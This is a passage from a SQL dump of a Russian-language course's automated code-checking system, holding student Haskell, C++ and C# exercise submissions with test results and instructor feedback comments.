(2296, 60, '318210', '2012-10-19 06:42:40', 1, 'Problem sent by mail', '<br/>Тесты успешно пройдены!'),
(2297, 68, '318210', '2012-10-19 06:42:52', 1, 'Problem sent by mail', '<br/>Тесты успешно пройдены!'),
(2298, 67, '318210', '2012-10-19 06:43:02', 1, 'Problem sent by mail', '<br/>Тесты успешно пройдены!'),
(2299, 66, '44060', '2012-10-19 06:45:38', 1, 'generalizedCantor n =\r\n    let\r\n    cantor n i =\r\n        let\r\n            list 1 a = [[a]]\r\n            list i a = [k:tail | k <- [1..a-i+1], tail <- list (i-1) (a-k)]\r\n        in\r\n        list n i ++ cantor n (i+1)\r\n    in\r\n    cantor n n', '<br/>Тесты успешно пройдены!'),
(2300, 69, '3431532', '2012-10-19 06:51:31', 1, 'bigSin x = head [sin y | y <- [1..], sin y >=x]', '<br/>Тесты успешно пройдены!'),
(2301, 69, '471091', '2012-10-19 06:53:01', 0, 'bigSin x = take 1 [ a | a<- (map (sin) [1..]), a > x ]', 'Не удалось вычислить выражение "(bigSin 0.99) < 0.991", проверьте правильность синтаксиса'),
(2302, 69, '471091', '2012-10-19 06:55:51', 1, 'bigSin x = head [ a | a<- (map (sin) [1..]), a > x ]', '<br/>Тесты успешно пройдены!'),
(2303, 69, '3607492', '2012-10-19 06:56:35', 1, 'bigSin x = head(dropWhile (<x) (map (sin) [1,2..]))\r\n', '<br/>Тесты успешно пройдены!'),
(2304, 70, '3607492', '2012-10-19 07:04:12', 1, 'myFilter d z = foldr (x a -> if (d x) then (x:a) else a) [] z', '<br/>Тесты успешно пройдены!'),
(2305, 65, '318210', '2012-10-19 07:04:34', 1, '﻿f n = [(i,j) | i <-[1..n], j <- [1..n], i + j == n] ++ (f (n + 1))\r\n\r\ncantor = f 2\r\n\r\n\r\n\r\n--какие ещё есть крутые решения ?\r\n  --- В принципе ничего особо крутого нет.. Но ваше решение можно сильно оптимизировать, \r\n  --- у вас же тут та же неэффективность\r\n  --- которую мы обсуждали в задачах coins и amicables. Потому что нет смысла писать j <- [1..n], i + j == n\r\n  --- Не зачем искать j перебором, мы можем его просто _посчитать_!\r\n  --- А еще можно обойтись вообще без рекурсии, вместо f тоже использовать list comprehension', '<br/>Тесты успешно пройдены!'),
(2306, 71, '3607492', '2012-10-19 07:15:05', 0, 'approxSum (x:y:xs) =if (y>0.00000001) then approxSum ((x+y):xs) else x\r\n\r\nz = approxSum (map (x -> 1.0 / (x*x)) [1,2..])', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2307, 72, 'Deutsche', '2012-10-19 07:21:32', 1, 'weekendExpences s = let \r\n			weekendRest = 0:0:0:0:0:1:1:weekendRest\r\n		    in sum (zipWith (*) s weekendRest)', '<br/>Тесты успешно пройдены!'),
(2308, 71, '3607492', '2012-10-19 07:23:13', 0, 'approxSum (x:y:xs) =if ((abs y)>0.00000001) then approxSum ((x+y):xs) else x', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2309, 71, '3607492', '2012-10-19 07:23:43', 1, 'approxSum (x:y:xs) =if ((abs y)>0.00000001) then approxSum ((x+y):xs) else x\r\n\r\nz = approxSum (map (x -> 1.0 / (x*x)) [1,2..])', '<br/>Тесты успешно пройдены!'),
(2310, 71, '471091', '2012-10-19 07:27:36', 0, 'aSum (x:xs) s = if x > 0.000001 then aSum xs (s+x) else s\r\napproxSum (x:xs) = aSum (x:xs) 0 \r\nz = approxSum (map (x -> 1/(x*x)) [1..])', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2311, 69, '2118411', '2012-10-19 07:28:35', 1, 'bigSin x\r\n        | x > 1 || x < -1 = error "x should be in range [-1;1]"\r\n            --- проверка < -1, мне кажется лишняя. Если x < -1, то ответ будет sin 1, но это не ошибка\r\n        | otherwise = (filter (>=x) [sin i|i<-[1..]])!!0\r\n', '<br/>Тесты успешно пройдены!'),
(2312, 70, '2118411', '2012-10-19 07:28:54', 1, 'myFilter f xs = (foldr (x res -> (if (f x) then (x:) else id).res) id xs) []\r\n', '<br/>Тесты успешно пройдены!'),
(2313, 71, '2118411', '2012-10-19 07:29:20', 1, 'approxSum = foldr (x right -> if (abs x >=0.000001) then (right+x) else x) 0\r\nz = approxSum [1/(i^2)|i<-[1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(2314, 72, '2118411', '2012-10-19 07:29:39', 1, 'days=1:2:3:4:5:6:7:days\r\nweekendExpences = sum.zipWith (x y-> if (x > 5) then y else 0) days\r\n', '<br/>Тесты успешно пройдены!'),
(2315, 73, '2118411', '2012-10-19 07:30:02', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs))\r\n', '<br/>Тесты успешно пройдены!'),
(2316, 71, '471091', '2012-10-19 07:30:25', 1, 'aSum (x:xs) s = if ((x > 0.000001) || (x < -0.000001 )) then aSum xs (s+x) else s\r\napproxSum (x:xs) = aSum (x:xs) 0 \r\nz = approxSum (map (x -> 1/(x*x)) [1..])', '<br/>Тесты успешно пройдены!'),
(2317, 74, '2118411', '2012-10-19 07:30:30', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) =\r\n        let\r\n                lres = foldTree f e l\r\n                rres = foldTree f e r\r\n        in f x lres rres\r\n\r\nsumPos = foldTree (x l r -> if x>0 then x+l+r else l+r) 0\r\n', '<br/>Тесты успешно пройдены!'),
(2318, 75, '2118411', '2012-10-19 07:31:17', 1, '-- foldr f e [] = e\r\n-- foldr f e (x:xs) = f x (foldr f e xs)\r\n-- foldr:: a1->a2->a3->a2       // e и e одного типа\r\n-- foldr:: a1->a2->[a4]->a2     // имеем дело со списком\r\n-- foldr:: (a4->a2->a2)->a2->[a4]->a2\r\n-- f имеет параметрами элемент списка, \r\n-- результат foldr и имеет возвращаемый тип такой же как у foldr\r\n-- Итого: (a->b->b)->b->[a]->b\r\n', '<br/>Тесты успешно пройдены!'),
(2319, 76, '2118411', '2012-10-19 07:31:48', 1, 'class Shape a where\r\n        perimeter::a->Double\r\n\r\ndata Rect = Rect Double Double\r\ndata Circle = Circle Double\r\n\r\ninstance Shape Rect where\r\n        perimeter (Rect x y) = 2*x+2*y\r\ninstance Shape Circle where\r\n        perimeter (Circle r) = 2*pi*r\r\n', '<br/>Тесты успешно пройдены!'),
(2320, 72, '3607492', '2012-10-19 07:35:46', 1, 'func [] _ sum = sum\r\nfunc (t:ts) x sum= if (x==0 || x==6) then func ts (mod (x+1) 7) (t+sum) else func ts (mod (x+1) 7) sum\r\n\r\nweekendExpences t = func t 1 0', '<br/>Тесты успешно пройдены!'),
(2321, 74, '3607492', '2012-10-19 07:40:58', 0, 'data Tree a = Leaf a | Branch a (Tree a) (Tree a)\r\n\r\n\r\nfoldTree f el (Leaf d) = f el d\r\nfoldTree f el (Branch d (x) (y)) = f (f el d) (f (foldTree f el x) (foldTree f el y))\r\n\r\nsumPos a = (foldTree (x y->if (mod x 2==0) then (x+y) else y) 0 a)', 'Не удалось вычислить выражение "sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))", проверьте правильность синтаксиса'),
(2322, 74, '3607492', '2012-10-19 07:42:44', 0, '\r\ndata Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\n\r\nfoldTree f el Empty = 0\r\nfoldTree f el (Node d (x) (y)) = f (f el d) (f (foldTree f el x) (foldTree f el y))\r\n\r\nsumPos a = (foldTree (x y->if (mod x 2==0) then (x+y) else y) 0 a)', 'Выражение имеет неправильное значение: sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))'),
(2323, 74, '3607492', '2012-10-19 07:44:30', 2, 'data Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\n\r\nfoldTree f el Empty = 0\r\nfoldTree f el (Node d (x) (y)) = f (f el d) (f (foldTree f el x) (foldTree f el y))\r\n\r\nsumPos a = (foldTree (x y->if (x>0) then (x+y) else y) 0 a)\r\n   --- Нет, это не тот вариант foldTree, который имелся в виду в условии (не тот, который является катаморфизмом)\r\n   --- (подсказка: у f должно быть три параметра)\r\n', '<br/>Тесты успешно пройдены!'),
(2324, 76, '3607492', '2012-10-19 08:04:45', 1, 'class Shape a where\r\n	perimeter::a->Float\r\n	square:: a->Float\r\n\r\ndata Circle a= Circle Float \r\ndata Rect a b= Rect Float Float\r\n\r\ninstance Shape (Circle a) where\r\n	perimeter (Circle a) = 2*pi*a\r\n	square (Circle a) = pi*a*a\r\ninstance Shape (Rect a b) where\r\n	perimeter (Rect a b) = 2*(a+b)\r\n	square (Rect a b)=a*b', '<br/>Тесты успешно пройдены!'),
(2325, 18, '3431532', '2012-10-19 08:47:21', 1, 'weekendExpences x = foldr (+) 0 (zipWith (*) x ([bicycle n | n <-[0..]]))\r\n\r\n\r\nbicycle n | ((n+1) `mod` 7) == 6  || ((n+1) `mod` 7 ) == 0 = 1\r\nbicycle n = 0', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(2326, 72, '3431532', '2012-10-19 08:47:49', 1, 'weekendExpences x = foldr (+) 0 (zipWith (*) x ([bicycle n | n <-[0..]]))\r\n\r\n\r\nbicycle n | ((n+1) `mod` 7) == 6  || ((n+1) `mod` 7 ) == 0 = 1\r\nbicycle n = 0', '<br/>Тесты успешно пройдены!'),
(2327, 72, '471091', '2012-10-19 09:13:44', 1, 'week = 0:0:0:0:0:1:1 : week\r\nweekendExpences xs = sum (zipWith (*) week xs)', '<br/>Тесты успешно пройдены!'),
(2328, 69, '397095', '2012-10-19 09:40:59', 0, 'bigSin x = take 1 (filter (>=x) [sin i | i <- [1..]])', 'Не удалось вычислить выражение "(bigSin 0.99) < 0.991", проверьте правильность синтаксиса'),
(2329, 69, '397095', '2012-10-19 09:42:29', 1, 'bigSin x = (filter (>=x) [sin i | i <- [1..]]) !! 0\r\n', '<br/>Тесты успешно пройдены!'),
(2330, 70, '397095', '2012-10-19 09:42:41', 1, 'myFilter f = foldr (x xs -> if f x then (x:xs) else xs) []', '<br/>Тесты успешно пройдены!'),
(2331, 72, '397095', '2012-10-19 09:45:34', 1, 'weekend = 0:0:0:0:0:1:1:weekend\r\nweekendExpences xs = sum (zipWith (*) weekend xs)', '<br/>Тесты успешно пройдены!'),
(2332, 56, '1384577', '2012-10-19 10:26:52', 1, 'allLists n 0 = [[]]\r\nallLists n k = [x:xs | x<-[1..n] , xs <- allLists n (k-1)]', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2333, 74, 'Deutsche', '2012-10-19 10:36:07', 2, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\ntype TreeAlg a = (a -> a -> a, a -> a, a)\r\n\r\nfoldTree :: TreeAlg a -> Tree a -> a\r\nfoldTree (f, g, start) Empty = start\r\nfoldTree (f, g, start) (Node x l r) = f (foldTree (f, g, start) l) (f (g x) (foldTree (f, g, start) r))\r\n\r\nsumPos :: Tree Double -> Double\r\nsumPos t = foldTree ((+), (x -> if (x>0) then x else 0), 0) t\r\n   --- Нет, это не совсем то. Алгебра в данном случае дб не такая (вы, я думаю, взяли ее из интернета, да?\r\n   --- Но там дерево другое.) \r\n   --- Подсказка: элементы  TreeAlg должны соответствовать вариантам определения Tree.\r\n   ---  Те если Tree описано как два варианта, то TreeAlg должна состоять из двух функций.\r\n   --- Ну или можете посмотреть конспект, там был очень похожий пример.\r\n   --- (На всякий случай, если не найдете ничего, пришлите это же решение 31 октября, я его зачту)', '<br/>Тесты успешно пройдены!'),
(2334, 66, '318210', '2012-10-19 11:23:10', 1, '﻿generalizedCantor n = gC n n\r\n\r\n\r\n\r\n-- n чисел сумма m\r\n\r\ngC n m = (func n m) ++ (gC n (m + 1))\r\n\r\n\r\n\r\nfunc n m = filter (x -> sum x == m) (allLists m n)\r\n\r\n		\r\n\r\nallLists n k = allLists1 n k [[]]\r\n\r\nallLists1 n k sp| k == 0 = sp\r\n\r\n		| otherwise = allLists1 n (k - 1) [ i : s | i <- [1..n], s <- sp ]\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2335, 71, '397095', '2012-10-19 11:52:44', 1, 'approxSum = as 0\r\nas s (x:xs) = if abs x < 0.000001 then s else as (x + s) xs\r\nz = approxSum [1 / (x * x) | x <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2336, 73, '397095', '2012-10-19 11:54:58', 1, 'fibs = 1:1:(zipWith (+) (tail fibs) fibs)', '<br/>Тесты успешно пройдены!'),
(2337, 74, '397095', '2012-10-19 11:59:43', 0, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nfoldTree2 f z Empty = z\r\nfoldTree2 f z (Node a left right) = \r\n	let\r\n		l = foldTree2 f z left\r\n		r = foldTree2 f z right\r\n	in\r\n		f a l r\r\n\r\nsumPos = foldTree2 (x y z -> x+y+z) 0', 'Выражение имеет неправильное значение: sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))'),
(2338, 74, '397095', '2012-10-19 12:01:40', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nfoldTree2 f z Empty = z\r\nfoldTree2 f z (Node a left right) = \r\n	let\r\n		l = foldTree2 f z left\r\n		r = foldTree2 f z right\r\n	in\r\n		f a l r\r\n\r\npos = x -> if x > 0 then x else 0\r\nsumPos = foldTree2 (x y z -> (pos x) + (pos y) + (pos z)) 0\r\n   --- Засчтитано, но вообще pos нужен только для x. у и z и так всегда положительные, это ведь частичные суммы', '<br/>Тесты успешно пройдены!'),
(2339, 76, '397095', '2012-10-19 12:12:08', 1, 'class Shape a where\r\n	perimeter :: a -> Double\r\n\r\ndata Rect = Rect Double Double\r\ninstance Shape Rect where\r\n	perimeter (Rect x y) = 2 * x + 2 * y\r\n\r\ndata Circle = Circle Double\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2 * 3.1415 * r', '<br/>Тесты успешно пройдены!'),
(2340, 65, '1384577', '2012-10-19 12:31:01', 1, 'cantor = [(x, y-x) | y <- [1..], x <- [1..y-1]]', '<br/>Тесты успешно пройдены!'),
(2341, 76, 'Deutsche', '2012-10-19 13:36:56', 1, 'data Rect = Rect Double Double\r\ndata Circle = Circle Double\r\nclass Shape a where \r\n	area :: a -> Double\r\n	perimeter :: a -> Double\r\n\r\ninstance Shape Rect where\r\n	area (Rect x y) = x*y\r\n	perimeter (Rect x y) = 2*(x+y)\r\n\r\ninstance Shape Circle where\r\n	area (Circle r) = 3.1415926*r*r\r\n	perimeter (Circle r) = 2*3.1415926*r', '<br/>Тесты успешно пройдены!'),
(2342, 73, '533223', '2012-10-19 13:39:53', 1, 'fibs = 1:1:( zipWith (+) fibs (tail fibs) )', '<br/>Тесты успешно пройдены!'),
(2343, 71, '533223', '2012-10-19 13:44:07', 0, 'approxSum (x:xs) = if x>0.000001 then x + approxSum xs else \r\nlist n = 1/(n^2):(list n+1)\r\nz = approxSum (list 1)', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2344, 60, '4837959', '2012-10-19 13:45:59', 1, '#include <iostream>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int MAXN = 1000;\r\n\r\nvoid nonZeroLastDigits(int *a, int size) {\r\n    int tmp[MAXN];\r\n    transform(a, a + size, tmp, [] (int i) { return i % 10; }); \r\n    int *end = remove_if(tmp, tmp + size, [] (int i) { return i == 0; });\r\n    for (int *i = tmp; i < end; ++i) {\r\n        cout << *i << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int a[] = {354, 20, 9, 31};\r\n    int a_size = 4;\r\n    nonZeroLastDigits(a, a_size);\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2345, 71, '533223', '2012-10-19 13:47:46', 2, 'approxSum (x:xs) = if(x>0.000001) then x + approxSum xs else \r\n   --- А что это за else на конце? Потерялось что-то наверное. Но в любом случае у вас сумма считается не совсем правильно..\r\nlist n = 1/(n^2):(list n+1)\r\nz = approxSum (list 1)', 'Не удалось вычислить выражение "z>1.64 && z<1.65", проверьте правильность синтаксиса'),
(2346, 59, '4837959', '2012-10-19 13:59:44', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace PrintNumbers\r\n{\r\n    class Program\r\n    {\r\n        static void nonZeroLastDigits(int[] a) \r\n        {\r\n            int[] tmp = a.Select(x => x % 10).ToArray();\r\n            tmp = tmp.Where(x => x > 0).ToArray();\r\n            foreach (int i in tmp)\r\n            {\r\n                Console.WriteLine(i);\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = {354, 20, 9, 31};\r\n            nonZeroLastDigits(a);\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2347, 73, '471091', '2012-10-19 14:32:33', 2, 'fib 0 = 0\r\nfib 1 = 1\r\nfib n = fib (n-1) + fib (n-2)\r\nfibs = [fib n | n <-[1..]]\r\n   --- Нет, это все-таки не засчтывается, видимо. Дел в том, что так вы не сможете сосчитать, скажем\r\n   ---  take fibs 50\r\n   --- Можете попробовать, вы увилите, что, начиная примерно с 15 элемента функция начинает считаться\r\n   --- долго, а где-то после 33 - очень, очень долго.\r\n   --- Те у вас решение очень неэффективное, и ри этом легко можно написать гораздо эфективнее, даже разными\r\n   --- способами. Попробуйте, пожалуйста придумать (если не получится, напишите мне по почте, пожалуйста,\r\n   --- я подскажу.', '<br/>Тесты успешно пройдены!'),
(2348, 60, '3607492', '2012-10-19 15:34:02', 1, '#include <iostream>\r\n#include <algorithm>    \r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int *arr,int size)\r\n{\r\n    int* pbegin = arr;\r\n    int* pend = arr+size;\r\n    int b[size];\r\n    transform(pbegin, pend, b, [] (int i) { return i%10; });   //\r\n    pbegin=b;\r\n    pend=b+size;\r\n    pend = remove_if (pbegin, pend, [] (int i) {return i%10==0;});\r\n      \r\n    cout << "range contains:";\r\n    for (int* p=pbegin; p!=pend; ++p)\r\n        cout << " " << *p;\r\n    \r\n    cout << endl;\r\n\r\n}\r\nint main(int argc, char const *argv[])\r\n{\r\n    int a[] = { 354, 20, 9, 31};\r\n\r\n            nonZeroLastDigits(a,sizeof(a)/sizeof(int));\r\n        return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2349, 67, '3607492', '2012-10-19 15:37:10', 1, '#include <iostream>\r\n#include <algorithm>    \r\nusing namespace std;\r\n\r\nvoid zeroDigits(int *arr,int size,int zeros)\r\n{\r\n    int* pbegin = arr;\r\n    int* pend = arr+size;\r\n    int b[size];\r\n    long unsigned int power = 1;\r\n    for (int i =0; i<zeros; i++)\r\n    {\r\n        power*=10;\r\n    }\r\n    transform(pbegin, pend, b, [& power] (int i) { return i/(power) * power; });   //\r\n    pbegin=b;\r\n    pend=b+size;\r\n          \r\n    cout << "range contains:";\r\n    for (int* p=pbegin; p!=pend; ++p)\r\n        cout << " " << *p;\r\n    \r\n    cout << endl;\r\n\r\n}\r\nint main(int argc, char const *argv[])\r\n{\r\n    int a[] = { 563, 5643, 76796};\r\n\r\n    zeroDigits(a,sizeof(a)/sizeof(int),2);\r\n    return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2350, 65, 'hasp', '2012-10-19 18:01:51', 1, 'cantor = concatMap (	 -> [(x, t - x) | x <- [1..t-1]]) [1..]', '<br/>Тесты успешно пройдены!'),
(2351, 66, 'hasp', '2012-10-19 18:02:17', 0, 'genLists l s = if l == 0 then [[s]] else concatMap (	 -> map (p -> t:p) (genLists (l-1) (s-t) ) ) [1..s-l]\r\n\r\ngeneralizedCantor n = concatMap (	 -> genLists n t) [1..]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2352, 66, 'hasp', '2012-10-19 18:03:36', 1, 'genLists l s = if l == 1 then [[s]] else concatMap (	 -> map (p -> t:p) (genLists (l-1) (s-t) ) ) [1..s-l]\r\n\r\ngeneralizedCantor n = concatMap (	 -> genLists n t) [1..]', '<br/>Тесты успешно пройдены!'),
(2353, 69, 'hasp', '2012-10-19 18:07:26', 1, 'import Data.List\r\n\r\nbigSin x = case (find (	 -> t >= x) [sin y | y  <- [1..] ] ) of Just x -> x\r\n   --- Или короче find (>=x)', '<br/>Тесты успешно пройдены!'),
(2354, 69, 'erwert', '2012-10-19 18:08:34', 1, 'bigSin x = head $ filter (a -> a >=x) [sin t | t <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2355, 70, 'hasp', '2012-10-19 18:11:09', 1, 'myFilter p l = foldr (	 acc -> if p t then t:acc else acc) [] l', '<br/>Тесты успешно пройдены!'),
(2356, 59, '1029771', '2012-10-19 18:13:30', 1, 'static int[] nonZeroLastDigits(int[] a) \r\n        {\r\n            var b = a.Select(n => n %10).Where(n => n % 10!=0);\r\n            a = b.ToArray();\r\n            return a;\r\n        }', '<br/>Тесты успешно пройдены!'),
(2357, 71, 'hasp', '2012-10-19 18:15:39', 1, 'approxSum l@(x:xs) = let approxI acc (x:xs) = if (abs x) <  0.000001 then acc else approxI (acc + x) xs in approxI 0 l\r\nz = approxSum [1/(x*x)| x <- [1..]]', '<br/>Тесты успешно пройдены!'),
(2358, 73, 'hasp', '2012-10-19 18:45:54', 1, 'fibs = 1: 1 : zipWith (a b -> a+b) fibs (tail fibs)\r\n    --- или просто zipWith (+)', '<br/>Тесты успешно пройдены!'),
(2359, 69, '318210', '2012-10-19 18:57:46', 1, '﻿numbersFrom n = n : numbersFrom ( n + 1 )\r\n   --- ОК, но вообще-то для этого есть стандартная запись [1..] \r\n\r\n--bigSin por = find ( > por ) ( map ( x -> sin x ) ( numbersFrom 1 ) )\r\n\r\nbigSin por = head  (  filter (x -> x > por) ( map ( x -> sin x ) ( numbersFrom 1 ) ) )\r\n', '<br/>Тесты успешно пройдены!'),
(2360, 72, 'hasp', '2012-10-19 18:59:02', 1, 'weekendExpencesI [] = 0 \r\n   --- Тут можно было написать weekendExcencesI _ = 0\r\n   --- (и поставить это правило вторым, конечно). Тогда не надо было бы отрезать лишние элементы у списка.\r\nweekendExpencesI (_:_:_:_:_:a:b:xs) = a+b+(weekendExpences xs)\r\nweekendExpences lst = let l = length lst in let t = l `mod` 7 in weekendExpencesI (take (l-t) lst)', '<br/>Тесты успешно пройдены!'),
(2361, 59, '383483', '2012-10-19 19:01:19', 2, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _13_1\r\n{\r\n    class Program\r\n    {\r\n\r\n        static void Main()\r\n        {\r\n            int[] inp = { 354, 20, 9, 3195, 1, 12, 0, 89, 90, 13, 445 };\r\n            int[] inter = inp.Select(a => int.Parse((a.ToString())[(a.ToString()).Length-1].ToString())).Where(x=>x>0).ToArray();\r\n    --- В принципе правильно, но в условии было ''написать функцию nonZeroLastDigits'' - а не просто напечатать\r\n    --- Исправьте, пожалуйста, это несложно\r\n    --- Еще, на самом деле у вас не очень эффективно. Тут ведь легко можно обойтись без ToString.\r\n    --- Ведь последняя цифра - это просто остаток от деления на 10. Но это как хотите, можете и не исправлять.\r\n            for (int i = 0; i < inter.Length; i++)\r\n                Console.Write("{0} ",inter[i]);\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2362, 70, '318210', '2012-10-19 19:30:54', 1, 'myFilter cond sp = foldr (x y -> if (cond x) then (x : y) else y ) [] sp ', '<br/>Тесты успешно пройдены!'),
(2363, 60, '383483', '2012-10-19 19:33:18', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\n\r\nint main()\r\n{\r\n	int inp[] = {22,15,3,45,10,550,168,7,0,13};\r\n	int outp[10];\r\n	transform(inp,inp+10, outp, [] (int i) {return (int)(i%10); });\r\n	int* end = remove_if(outp, outp+10, [] (int i) {return i==0;});\r\n --- Тут надо было не просто проделать эти действия, а написать отдельную функцию. Это просто, но напишите, пожалуйста.\r\n	int t=0;\r\n	while ((outp+t)!=end)\r\n	{\r\n	cout<<outp[t]<<" ";\r\n	t++;\r\n	}\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(2364, 71, '318210', '2012-10-19 20:24:18', 0, '﻿approxSum sp = sum ( takeWhile ( > 0.000001 ) sp )\r\n\n\r\n\n\r\n\ninvSq n = (1 / ( n * n) ) : invSq( n + 1 )\r\n\nz = approxSum ( invSq 1 )\n', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2365, 71, '318210', '2012-10-19 20:28:23', 1, 'approxSum sp = sum ( takeWhile (x -> abs(x) > 0.000001 ) sp )\r\n\r\n\r\ninvSq n = (1 / ( n * n) ) : invSq( n + 1 )\r\nz = approxSum ( invSq 1 )', '<br/>Тесты успешно пройдены!'),
(2366, 73, 'tonyo', '2012-10-19 20:28:40', 0, 'fib = 1 : 1 : (zipWith (+) fib fib_tail) \r\n    where fib_tail = tail fib\r\n', 'Не удалось вычислить выражение "take 10 fibs", проверьте правильность синтаксиса'),
(2367, 73, 'tonyo', '2012-10-19 20:29:32', 1, 'fibs = 1 : 1 : (zipWith (+) fibs fibs_tail) \r\n    where fibs_tail = tail fibs\r\n', '<br/>Тесты успешно пройдены!'),
(2368, 69, 'tonyo', '2012-10-19 20:34:58', 1, 'bigSin x = head $ filter (>x) [sin t | t <- [1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(2369, 71, 'tonyo', '2012-10-19 21:07:20', 1, 'approxSum (x:xs) = if abs x < eps \r\n                   then 0 \r\n                   else x + approxSum xs   \r\n    where eps = 0.000001\r\n\r\nz = approxSum [ 1/i^2 | i <- [1..] ]\r\n', '<br/>Тесты успешно пройдены!'),
(2370, 69, '5656962', '2012-10-20 05:58:02', 1, 'bigSin x = head(filter(>=x)(map(i -> sin i)[1..]))\r\n\r\n	\r\n', '<br/>Тесты успешно пройдены!'),
(2371, 70, '5656962', '2012-10-20 05:58:51', 1, 'myFilter cond list = foldr (i res -> if cond i then i:res else res) [] list\r\n', '<br/>Тесты успешно пройдены!'),
(2372, 72, '5656962', '2012-10-20 05:59:24', 0, 'weekendExpences list = sum(zipWith(*) weekends list)\r\n\nweekends = :0:0:0:0:1:1:weekends\n', 'Не удалось вычислить выражение "weekendExpences [3,1,4,12,3,5,17,6,7,7,8,18,5,1,3]", проверьте правильность синтаксиса'),
(2373, 72, '5656962', '2012-10-20 06:00:48', 1, 'weekendExpences list = sum(zipWith(*) weekends list)\r\n\r\nweekends = 0:0:0:0:0:1:1:weekends\r\n', '<br/>Тесты успешно пройдены!'),
(2374, 73, '5656962', '2012-10-20 06:01:31', 1, 'fibs = 1:1:zipWith(+) fibs (tail(fibs))\r\n', '<br/>Тесты успешно пройдены!'),
(2375, 72, '318210', '2012-10-20 06:10:38', 1, '﻿weekendExpences sp = wE sp 0 0\r\n\r\n\r\n\r\nwE [] sum _ = sum\r\n\r\nwE (x:xs) sum cnt | cnt == 5  = wE (xs) (sum + x) (cnt + 1)\r\n\r\n		| cnt == 6 = wE (xs) (sum + x) 0\r\n\r\n		| otherwise = wE (xs) sum (cnt + 1)\r\n', '<br/>Тесты успешно пройдены!'),
(2376, 56, '471091', '2012-10-20 06:21:06', 1, 'allLists n 1 = [[x]|x<-[1..n]]\r\nallLists n k = [[x] ++ y |x<-[1..n], y<- allLists n (k-1)] ', '<br/>Тесты успешно пройдены!'),
(2377, 73, '318210', '2012-10-20 07:08:37', 1, 'fibs = 1 : 1 : zipWith (+) fibs (tail fibs)', '<br/>Тесты успешно пройдены!'),
(2378, 56, '5656962', '2012-10-20 07:09:59', 1, 'allLists n 0 = [[]]\r\n\r\nallLists n k = [(x:xs) | x <- [1..n], xs <- allLists n (k-1)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2379, 66, '5656962', '2012-10-20 07:28:57', 0, 'ganeralizedCantor 0 = [[]]\r\n\nganeralizedCantor k = [(x:xs) | x <- [1..], xs <- ganeralizedCantor (k-1)]\r\n\n\n', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2380, 66, '5656962', '2012-10-20 07:33:27', 2, 'generalizedCantor 0 = [[]]\r\n\r\ngeneralizedCantor k = [(x:xs) | x <- [1..], xs <- generalizedCantor (k-1)]\r\n   --- Нет, это мы в прошлый раз говорили, list comprehension нельзя применять для\r\n   --- двух бесконечных списков. Попробуйте напечатать\r\n   --- take 100 (generalizedCantor 3) и вы увидете что-то вроде\r\n   --- [[1,1,1],[1,1,2],[1,1,3],[1,1,4],\r\n   --- те видно, что мы даже [2,1,1] в этом списке никогда не найдем\r\n', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2381, 76, '318210', '2012-10-20 07:37:12', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n	perimeter:: a -> Double\r\n	area:: a -> Double\r\n	contains:: a -> Double -> Double -> Bool\r\n\r\ninstance Shape Rect where\r\n	area ( Rect x y ) = x * y\r\n	perimeter (Rect x y ) = 2 * ( x + y )\r\ninstance Shape Circle where\r\n	area ( Circle r ) = 3.14 * r * r\r\n	perimeter ( Circle r ) = 2 * 3.14 * r', '<br/>Тесты успешно пройдены!'),
